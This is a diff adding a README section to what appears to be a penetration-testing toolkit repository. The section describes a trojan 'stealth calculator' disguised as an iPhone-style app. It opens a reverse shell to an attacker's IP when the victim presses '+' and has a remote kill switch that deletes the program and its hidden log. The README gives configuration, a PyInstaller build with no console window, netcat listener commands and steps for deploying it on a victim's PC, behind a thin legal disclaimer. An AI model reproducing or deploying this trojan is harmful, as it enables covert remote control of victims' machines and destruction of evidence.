@@ -87,3 +87,102 @@ FULL PENTEST TOOLKIT (v1.0)
 ---
 
 🌐 **Website:** [https://pentrax.onrender.com](https://pentrax.onrender.com) 
+
+# iPhone-Style Stealth Calculator (Red Team Demo)
+
+**WARNING: This project is for educational, red team, and authorized penetration testing use only. Unauthorized use is illegal and unethical.**
+
+---
+
+## Features
+- **Beautiful iPhone-style calculator UI** (Tkinter, Windows-ready)
+- **Stealth reverse shell**: Triggers when the user presses `+`, connects back to the attacker's machine
+- **Remote kill switch**: Attacker can type `KILL` in the shell to self-destruct the calculator and erase logs
+- **Self-destruction**: Deletes its own executable/script and `.calc_log` file on kill
+- **One-time trigger**: Reverse shell only launches once per run
+- **Logging**: Each trigger is logged to a hidden `.calc_log` file
+
+---
+
+## Usage (Red Team / Pentest Demo)
+
+1. **Configure the Reverse Shell**
+   - Edit `calculator.py` and set:
+     ```python
+     ATTACKER_IP = "YOUR_KALI_IP"  # <-- Set your Kali IP here
+     ATTACKER_PORT = 4444           # <-- Set your desired port here
+     ```
+
+2. **Build the Executable (Optional)**
+   - Use [PyInstaller](https://www.pyinstaller.org/) to create a Windows `.exe`:
+     ```bash
+     pyinstaller --onefile --noconsole calculator.py
+     ```
+
+3. **Start Listener on Kali**
+   - On your Kali machine:
+     ```bash
+     nc -lvnp 4444
+     ```
+
+4. **Deploy the Calculator**
+   - Run the calculator on the target Windows PC.
+   - When the user presses `+`, you get a shell on your Kali terminal.
+
+5. **Remote Kill Switch**
+   - In your shell, type:
+     ```
+     KILL
+     ```
+   - The calculator will self-destruct and exit.
+
+---
+
+## How the Attacker Gets Connected
+
+Once the calculator is running on the victim's device, the attacker must:
+
+1. **Start a Listener on Kali**
+   - Open a terminal and run:
+     ```bash
+     nc -lvnp 4444
+     ```
+     (Replace `4444` with the port you set in `ATTACKER_PORT`.)
+
+2. **Wait for the Trigger**
+   - The victim uses the calculator as normal.
+   - When the user presses the `+` button, the reverse shell is triggered and connects back to your Kali machine.
+
+3. **Get the Shell**
+   - As soon as the user presses `+`, you will see a connection in your Netcat terminal.
+   - You now have a command shell on the victim’s machine. Type commands and see the output.
+
+4. **(Optional) Use the Kill Switch**
+   - To self-destruct the calculator remotely, type:
+     ```
+     KILL
+     ```
+     in your shell and press Enter. The calculator will delete itself and its logs, then exit.
+
+### Summary Table
+
+| Step                | Action on Attacker (Kali) Side         | Action on Victim Side         |
+|---------------------|----------------------------------------|-------------------------------|
+| 1. Start Listener   | `nc -lvnp 4444`                        |                               |
+| 2. Deploy Calculator|                                        | User runs calculator.exe      |
+| 3. Trigger Shell    |                                        | User presses `+`              |
+| 4. Get Shell        | Shell appears in Netcat terminal       |                               |
+| 5. Remote Kill      | Type `KILL` in shell, press Enter      | Calculator self-destructs     |
+
+---
+
+## Ethical & Legal Notice
+- **This project is for educational and authorized security testing only.**
+- Do not use, distribute, or demonstrate this tool without explicit permission.
+- The authors are not responsible for misuse or damages.
+
+---
+
+## Credits
+- UI inspired by iPhone Calculator
+- Reverse shell and kill switch for red team/pentest demo scenarios 
